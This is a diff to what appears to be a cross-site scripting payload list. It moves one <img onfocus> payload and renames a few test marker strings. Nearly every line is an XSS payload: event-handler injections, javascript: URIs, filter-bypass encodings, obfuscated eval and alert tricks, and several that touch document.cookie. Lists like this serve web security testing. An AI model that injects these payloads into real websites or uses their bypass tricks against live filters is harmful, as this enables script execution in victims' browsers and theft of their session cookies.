@@ -1,3 +1,4 @@
+<img onfocus=alert(1) autofocus tabindex=1>
 #<script>alert(1)</script>
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
 "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
@@ -19,12 +20,11 @@ IMG+LOWSRC="javascript:alert(1);">
 <isindex+type=image+src=1+onerror=alert(1)>
 <img src=x onerror="alert(origin)">
 <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;	
-ibro"*alert(1)*"
+test"*alert(1)*"
 "><body/onload="{x:onerror=alert};x"	
 <script>eval('al'+'ert(1)');</script>
 'alert(1)'.replace(/.+/,eval)
-<img src/onerror=alert(1)>
-<img onfocus=alert(1) autofocus tabindex=1>	
+<img src/onerror=alert(1)>	
 <p onfocus=alert(1) autofocus tabindex=1>	
 <form onfocus=alert(1) autofocus tabindex=1>	
 <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>	
@@ -94,7 +94,7 @@ themecolor=%22-alert('XSS')-%22
 <img/src/onerror="window[`al+/e/[`ex + `ec`]`e`+`rt`](2)">
 <img/src/onerror="this.ownerDocument.defaultView['\u0061lert'](4)">
 <iframe src-doc="<svg onload=alert (1337)&nvgt;"></iframe>
-&#60;body onload=alert('ibrahimxss')&#62;&#34;&#34;
+&#60;body onload=alert('xss')&#62;&#34;&#34;
 onpointerover=”alert(‘XSS’)
 jAvaScripT:(alert)`1`
 javascript:alert('1')
